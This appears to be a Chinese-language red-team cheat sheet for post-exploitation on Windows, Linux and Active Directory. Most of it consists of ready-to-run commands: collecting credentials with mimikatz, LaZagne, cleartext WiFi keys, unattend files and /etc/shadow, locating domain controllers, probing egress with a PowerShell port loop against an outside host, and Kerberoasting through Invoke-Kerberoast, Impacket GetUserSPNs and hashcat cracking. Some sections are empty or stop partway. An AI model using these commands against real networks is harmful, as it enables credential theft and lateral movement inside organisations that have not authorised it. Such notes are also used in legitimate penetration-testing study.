net group "Enterprise Admins" /domain 	#	查询管理员用户组
net group "Domain Controllers" /domain 	#	查询域控制器
~~~

~~~
凭据收集C:\Users\batma\AppData\Roaming
~~~

~~~shell
收集各种密文，明文，口令等，为后续横向渗透做好测试准备
计算机用户 HASH，明文获取-mimikatz(win)，mimipenguin(linux)
计算机各种协议服务口令获取-LaZagne(all)
Netsh WLAN show profiles
Netsh WLAN show profile name="无线名称" key=clear
1.站点源码备份文件、数据库备份文件等
2.各类数据库 Web 管理入口，如 PHPMyAdmin
3.浏览器保存密码、浏览器 Cookies
4.其他用户会话、3389 和 ipc$连接记录、回收站内容
5.Windows 保存的 WIFI 密码
6.网络内部的各种帐号和密码，如：Email、VPN、FTP、OA 等
~~~

### windows信息收集

#### 基本命令

- 主机名 `hostname`
- 查看配置及补丁信息`systeminfo`
- 查看版本 `ver`
- 查看杀软`WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List`


#### 域信息

- 获取当前组的计算机名 `net view`，网络发现 `net view /all` ，查看所有域 `net view /domain`
- 判断域控是否存在

~~~powershell
ipconfig /all
systeminfo
net config workstation
~~~

- 定位域控 `net time /domain`

~~~php
nslookup test.com		//这里test.com是域控域名，通过ipconfig /all得到
nslookup -type=SRV _ldap._tcp	//这里nslookup是解析地址，因为内网中dns服务器就在域控上
net time /domain	//这里因为时间是和域控时间同步
此外作为域控，他的域名可能是DC，DC-control,父域名等，因为是dns服务器所以开放53端口，且kerberos协议开放88端口
~~~

![](https://s4.ax1x.com/2022/01/01/T5b77Q.png)

#### 用户信息

- 查看用户`whoami /priv` / `whoami /user`

- 用户特权信息 `whoami /priv`

- 查看当前权限 `net localgroup administrators`

- 查看在线用户 `quser` / `qwinsta` / `query user`

- 查看当前计算机名，全名，用户名，系统版本，工作 站域，登陆域 `net config Workstation`

- ACL 信息 `get-acl`

##### 网络信息

- 内网网段信息

- 网卡信息 `ipconfig`

- 外网出口

- ARP表 `arp -a`

- 路由表 `route print`

- 监听的端口 `netstat -ano`

- 连接的端口

- - 端口信息

    `Get-NetTCPConnection`

- hosts文件

- 主备 DNS

- - DNS缓存

    `ipconfig /displaydns``Get-CimInstance -Namespace root/StandardCimv2 -ClassName MSFT_DNSClientCache`

- - 探测出网情况

    powershell -c "1..65535 | % {echo ((new-object Net.Sockets.TcpClient).Connect('allports.exposed',$_)) $_ } 2>$null"

#### 防火墙

- 查看防火墙状态 `netsh advfirewall show allprofiles`
- 防火墙日志目录 `netsh firewall show logging`
- 防火墙规则 `netsh advfirewall firewall show rule name=all`
- `netsh firewall show config`
- `netsh firewall show state`

#### 密码信息

- Windows RDP连接记录

- 浏览器中保存的账号密码

- 系统密码管理器中的各种密码

- - 无人值守安装文件中的密码信息

    `C:\sysprep.inf``C:\sysprep\sysprep.xml``C:\Windows\Panther\Unattend\Unattended.xml``C:\Windows\Panther\Unattended.xml`

#### 票据信息

- `cmdkey /l`
- klist
- msf meterpreter

#### 特殊文件

- - 文档

    xlsx / xlsdocx / docpptx / pptvsdx / vsdmd / txt

- - 压缩文件

    zip / rar / 7z

- - VPN配置

    ovpn

- - 代码

    py / php / jsp / aspx / asp / sql

- - 配置文件

    conf / ini / xml

- - 特定关键字

    账号 / 账户 / 登录 / login / user密码 / pass代码 / 文档 / 交接 / 备份 / git / svn邮箱 / 通讯录 / 集群 / 办公代理 / 内网 / VPN设备 / 资产系统 / 运维 / 拓扑 / 网络 / IT后台 / 管理员 / 数据库监控 / 隔离 / 防火墙 / 网闸 / 巡检

#### 局域网存活主机

- NetBIOS扫描
- OXID扫描

#### 其他

- 启用的共享文件夹

- 回收站

- 最近运行的命令

- 访问文件历史记录

- - 查看补丁安装情况

    `wmic qfe get Caption,Description,HotFixID,InstalledOn`

- - 日志与事件信息

    `wevtutil``eventvwr`

- - 注册表信息

    `reg`

- 安装的各类 agent 监控软件

- 安装的杀毒软件

- - 查看/设置后缀关联

    `assoc``assoc .ext=example`

- PowerShell 版本

- .Net 版本

- Wi-Fi 密码



### linux信息收集

#### 获取内核，操作系统和设备信息

- - 版本信息

    `uname -a` 所有版本`uname -r` 内核版本信息`uname -n` 系统主机名字`uname -m` Linux内核架构

- 内核信息 `cat /proc/version`

- CPU信息 `cat /proc/cpuinfo`

- - 发布信息

    `cat /etc/*-release``cat /etc/issue`

- 主机名 `hostname`

- 文件系统 `df -a`

- 内核日志 `dmesg` / `/var/log/dmesg`

#### 用户和组

- 列出系统所有用户 `cat /etc/passwd`

- 列出系统所有组 `cat /etc/group`

- 列出所有用户hash（root）``cat /etc/shadow``

- - 用户

    查询用户的基本信息 `finger`当前登录的用户 `users` `who -a` `/var/log/utmp`查询无密码用户 `grep 'x:0:' /etc/passwd`

- 目前登录的用户 `w`

- 登入过的用户信息 `last` / `/var/log/wtmp`

- 显示系统中所有用户最近一次登录信息 `lastlog` / `/var/log/lastlog`

- 登录成功日志 `/var/log/secure`

- 登录失败日志 `/var/log/faillog`

- 查看特权用户 `grep :0 /etc/passwd`

- 查看passwd最后修改时间 `ls -l /etc/passwd`

- 查看是否存在空口令用户 `awk -F: 'length($2)==0 {print $1}' /etc/shadow`

- 查看远程登录的账号 `awk '/\$1|\$6/{print $1}' /etc/shadow`

- - 查看具有sudo权限的用户

    `cat /etc/sudoers | grep -v "^#\|^$" | grep "ALL=(ALL)"`

#### 用户和权限信息

- 当前用户 `whoami`
- 当前用户信息 `id`
- 可以使用sudo提升到root的用户（root） `cat /etc/sudoers`
- 列出目前用户可执行与无法执行的指令 `sudo -l`

#### 环境信息

- 打印系统环境信息 `env`
- 打印系统环境信息 `set`
- 环境变量中的路径信息 `echo  $PATH`
- 打印历史命令 `history` / `~/.bash_history`
- 显示当前路径 `pwd`
- 显示默认系统遍历 `cat /etc/profile`
- 显示可用的shell `cat /etc/shells`

#### 进程信息

- 查看进程信息 `ps aux`
- 资源占有情况 `top -c`
- 查看进程关联文件 `lsof -c $PID`
- 完整命令行信息 `/proc/$PID/cmdline`
- 进程的命令名 `/proc/$PID/comm`
- 进程当前工作目录的符号链接 `/proc/$PID/cwd`
- 运行程序的符号链接 `/proc/$PID/exe`
- 进程的环境变量 `/proc/$PID/environ`
- 进程打开文件的情况 `/proc/$PID/fd`

#### 服务信息

- 由inetd管理的服务列表 `cat /etc/inetd.conf`
- 由xinetd管理的服务列表 `cat /etc/xinetd.conf`
- nfs服务器的配置 `cat /etc/exports`
- 邮件信息 `/var/log/mailog`
- ssh配置 `sshd_config`

#### 计划任务

- 显示








### 信息收集

#### SPN探针

SPN扫描不需要连接到域内网络上的每个IP即可检查服务端口。SPN扫描通过对域控制器的LDAP查询执行服务发现。由于SPN查询是正常Kerberos票证行为的一部分，因此即使是攻击者，检测也很难发现是善意还是恶意的查询，而network端口扫描非常明显。

##### SPN 格式与配置

~~~powershell
<serviceclass>/<host>:<port>/<service name>

<service class>：标识服务类的字符串

<host>：服务所在主机名称

<port>：服务端口

<service name>：服务名称
~~~

例：

为 SQL Server 服务帐户注册SPN

手动注册：

```powershell
setspn -A MSSQLSvc/myhost.redmond.microsoft.com:1433 accountname
```

对应的命名实例：

```powershell
setspn -A MSSQLSvc/myhost.redmond.microsoft.com/instancename accountname
```

如果我想把域中一台主机Srv-DB-0day中的 MSSQL 服务注册到 SPN 中则可以使用命令：

```powershell
setspn -A MSSQLSvc/Srv-DB-0day.Oday.org:1433 sqladmin
```

可以通过下面两个命令来查看已经注册的 SPN。

```
setspn -q */* 
setspn -T 0day.org -q */*
```

##### SPN扫描

~~~powershell
Discover-PSMSSQLServers:  是 Powershell-AD-Recon 工具集中的一个工具，用来查询已经注册了的 MSSQL 类型的 SPN。
GetUserSPNs.ps1:          是 Kerberoast 工具集中的一个 powershell 脚本，用来查询域内注册的 SPN
PowerView.ps1:            在 Powersploit 和 Empire 工具里都有集成，PowerView 相对于上面几种是根据不同用户的 objectsid 来返回，返回的信息更加详细。
~~~

##### LDAP

LDAP 协议全称是 LightweightDirectory Access Protocol，一般翻译成轻量目录访问协议。是一种用来查询与更新 Active Directory 的目录服务通信协议。AD 域服务利用 LDAP 命名路径（LDAP naming path）来表示对象在 AD 内的位置，以便用它来访问 AD 内的对象。



LDAP 数据的组织方式：

[![oaSpjI.png](https://z3.ax1x.com/2021/12/03/oaSpjI.png)](https://imgtu.com/i/oaSpjI)

更直观的说可以把 LDAP 协议理解为一个关系型数据库，其中存储了域内主机的各种配置信息。

在域控中默认安装了 ADSI 编辑器，全称 ActiveDirectory Service Interfaces Editor (ADSI Edit)，是一种 LDAP 的编辑器，可以通过在域控中运行 adsiedit.msc 来打开（服务器上都有，但是只有域控中的有整个域内的配置信息）。

通过 adsiedit.msc 我们可以修改和编辑 LADP，在 SPN 查询时实际上就是查询 LADP 中存储的内容。

##### kerberoasting

###### 攻击方式1

如果我们有了SPN的注册权限，我们就可以给指定的域用户注册一个SPN，然后获取到TGS，然后破解得到密码

在 TGS_REP 中，TGS 会返回给 Client 一张票据 ST，而 ST 是由 Client 请求的 Server 端密码进行加密的。当 Kerberos 协议设置票据为 RC4 方式加密时，我们就可以通过爆破在 Client 端获取的票据 ST，从而获得 Server 端的密码

1. 首先用SPN扫描
2. 根据扫描出的结果使用微软提供的类 Kerberos Requestor Security Token 发起 kerberos 请求，申请 ST 票据

~~~powershell
PS C:\> Add-Type -AssemblyNameSystem.IdentityModel
PS C:\> New-ObjectSystem.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList"MSSQLSvc/s2:1433"
~~~



可以看到这个过程通过AS-REQ、AS-REP、TGS-REQ、TGS-REP这四个认证流程，获取到 RC4 方式加密的票据

3. Kerberos 协议中请求的票据会保存在内存中，可以通过 klist 命令查看当前会话存储的 kerberos 票据

这里可以借助 mimikatz 导出，使用 kerberoast 工具集中的 tgsrepcrack.py 工具进行离线爆破，成功得到 tsvc 账号的密码 admin1234!

###### 攻击方式2

Kerberoasting攻击方式一中需要通过 mimikatz 从内存中导出票据，Invoke-Kerberoast 通过提取票据传输时的原始字节，转换成 John the Ripper 或者 HashCat 能够直接爆破的字符串。

使用 Invoke-Kerberoast 脚本 (这里使用的是 Empire 中的 Invoke-Kerberoast.ps1)

~~~
Import-module Invoke-Kerberoast.ps1
Invoke-kerberoast -outputformat hashcat |fl
~~~

使用 HASHCAT 工具进行破解

~~~
PSC:> hashcat64.exe –m 13100 test1.txt password.list --force
~~~



##### Impacket 进行Kerberoasting

这里要用到**impacket**工具包，该工具包用于对SMB1-3或IPv4 / IPv6 上的TCP、UDP、ICMP、IGMP，ARP，IPv4，IPv6，SMB，MSRPC，NTLM，Kerberos，WMI，LDAP等协议进行低级编程访问。这里我们使用的是GetUserSPNs工具，可使用该工具对目标主机进行SPN探测

~~~http
https://github.com/SecureAuthCorp/impacket               官方仓库https://github.com/maaaaz/impacket-examples-windows      有人已将各个脚本打包成相应的exe,此处绝大部分也都将全部用这些exe单文件来进行操作
~~~

命令

~~~python
python GetUserSPNs.py -request -dc-ip x.x.x.x 域名称/域用户
~~~



~~~
hashcat64.exe –m 13100 test1.txt password.list --force
~~~





















































